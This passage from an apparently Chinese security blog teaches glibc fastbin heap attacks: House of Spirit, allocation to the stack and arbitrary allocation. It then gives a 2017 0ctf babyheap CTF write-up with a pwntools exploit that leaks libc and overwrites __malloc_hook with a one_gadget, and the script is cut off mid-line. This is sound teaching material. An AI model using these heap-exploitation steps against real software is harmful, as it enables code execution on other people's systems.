+-------------+</span><br><span class="line">+-----&gt;+   chunk0   |</span><br><span class="line">       +------------+</span><br><span class="line"></span><br><span class="line">       +------------+</span><br><span class="line">       |   chunk1   |</span><br><span class="line">       |  allocated |</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;由于之前将 chunk0 的 fd 指针指向了 fake chunk，</span><br><span class="line">&#x2F;&#x2F;并且 chunk0 还呆在 fastbin 里，</span><br><span class="line">&#x2F;&#x2F;所以第三次 malloc()时，</span><br><span class="line">&#x2F;&#x2F;malloc()会将 chunk0 的 fd 赋给 fastbinY[i]，</span><br><span class="line">&#x2F;&#x2F;此时只要再进行一次malloc()就可以分配到 fake chunk 了。</span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">|            |</span><br><span class="line">+-----+------+       +-------------+</span><br><span class="line">      |              |             |</span><br><span class="line">      +-------------&gt;+  fake chunk |</span><br><span class="line">                     |             |</span><br><span class="line">+------------+       +-------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk0   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk1   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></div><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p><code>the Malloc Maleficarum</code> 中的一种技术。</p><p>主要意思是我们想要控制的区域控制不了，但它前面和后面都可以控制，所以伪造好数据将它释放到fastbin里面，后面将该内存区域当做堆块申请出来，致使该区域被当做普通的内存使用，从而目标区域就变成了可控的了。</p><p>核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>需要绕过的检测:</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2*SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  how2heap git:(master) .&#x2F;house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;&#x3D; 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!</span><br><span class="line">malloc(0x30): 0x7ffd9bceaa60</span><br></pre></td></tr></table></figure></div><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><p>通过该技术可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.<span class="built_in">size</span>=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>与 Alloc to stack 是完全相同的，只要满足目标地址存在合法的 size 域，就可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h2 id="例-2017-0ctf-babyheap"><a href="#例-2017-0ctf-babyheap" class="headerlink" title="例 2017 0ctf babyheap"></a>例 2017 0ctf babyheap</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Command: "</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX enabled</span></span><br><span class="line"><span class="comment">    PIE:      PIE enabled</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Fill</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = Read();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="number">24L</span>L * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = Read();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = sub_11B2(*(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);   <span class="comment">/////可读取任意长度</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>基本利用思路</p><ul><li>利用 unsorted bin 地址泄漏 libc 基地址。</li><li>利用 fastbin attack 将 chunk 分配到 malloc_hook 附近。</li></ul><h4 id="leak-libc基地址"><a href="#leak-libc基地址" class="headerlink" title="leak libc基地址"></a>leak libc基地址</h4><p>构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置才可以进行泄漏。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. leak libc base</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆当前布局</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x560ce09d8290</span><br><span class="line">0x560ce09d8290:0x00000000000000000x0000000000000021 &#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk0</span><br><span class="line">0x560ce09d82a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x560ce09d82b0:0x00000000000000000x0000000000000021 &#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk1(free)</span><br><span class="line">0x559499e682c0:0x00000000000000000x0000559499e68010</span><br><span class="line">0x560ce09d82d0:0x00000000000000000x0000000000000021 &#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk2(free)</span><br><span class="line">0x559499e682e0:0x0000559499e682c00x0000559499e68010</span><br><span class="line">0x560ce09d82f0:0x00000000000000000x0000000000000021 &#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk3</span><br><span class="line">0x560ce09d8300:0x00000000000000000x0000000000000000</span><br><span class="line">0x560ce09d8310:0x00000000000000000x0000000000000091 &#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk4</span><br><span class="line">0x560ce09d8320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>此时使用 fill 覆盖 fastbin 头部 chunk 的 fd 值，将其改写成 small chunk 的地址，那么通过两次 alloc，先将 small chunk 放入 fastbin，再将其取出来，获得指向它的 index。要这么做必须绕过 malloc 的安全检查。</p><p>chunksize 的计算方法是 <code>victim-&gt;size &amp; ~(SIZE_BITS))</code>，而对应的 index 计算方法为 <code>(size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2</code>，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 <code>(size &gt;&gt; 4) - 2</code>，那么我们将 small chunk 的 size 域改写成 0x21 即可。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"> </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"> </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x55db5f3d4290</span><br><span class="line">0x55db5f3d4290:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55db5f3d42b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55db5f3d42d0:0x00000000000000000x0000000000000021</span><br><span class="line">0x55db5f3d42e0:0x000055db5f3d42800x000055db5f3d4010 --+ chunk2</span><br><span class="line">0x55db5f3d42f0:0x00000000000000000x0000000000000021   |</span><br><span class="line">0x55db5f3d4300:0x00000000000000000x0000000000000000   |</span><br><span class="line">0x55db5f3d4310:0x00000000000000000x0000000000000021 &lt;-+ chunk4</span><br><span class="line">0x55db5f3d4320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>可以看到 index[2] 存放的是 small chunk 的地址，此时将 small chunk 的 size 改写回来，将其释放掉就可以 dump 出来了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br></pre></td></tr></table></figure></div><p>main_arena_offset脚本 <a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">https://github.com/bash-c/main_arena_offset</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash main_arena .&#x2F;x64_libc.so.6 </span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]&#x3D;b5381a457906d279073822a5ceb24c4bfef94ddb</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br></pre></td></tr></table></figure></div><h4 id="分配-chunk-到-malloc-hook-附近"><a href="#分配-chunk-到-malloc-hook-附近" class="headerlink" title="分配 chunk 到 malloc_hook 附近"></a>分配 chunk 到 malloc_hook 附近</h4><p>由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为 0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小 chunk，所以根据堆分配器规则，它会依次处理 unsorted bin 中的 chunk，将其放入到对应的 bin 中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的 chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;32xw (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7fa8a92a6b40 &lt;_IO_wide_data_0+224&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b50 &lt;_IO_wide_data_0+240&gt;:0xa92a7f600x00007fa80x000000000x00000000</span><br><span class="line">0x7fa8a92a6b60 &lt;__memalign_hook&gt;:0xa91595a00x00007fa80xa9159c200x00007fa8</span><br><span class="line">0x7fa8a92a6b70 &lt;__malloc_hook&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b80 &lt;main_arena&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6b90 &lt;main_arena+16&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6ba0 &lt;main_arena+32&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fa8a92a6bb0 &lt;main_arena+48&gt;:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit idx4's fd point to fake chunk</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, len(fake_chunk), fake_chunk)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">'a'</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment"># trigger malloc_hook</span></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(payload)))</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak libc base</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span 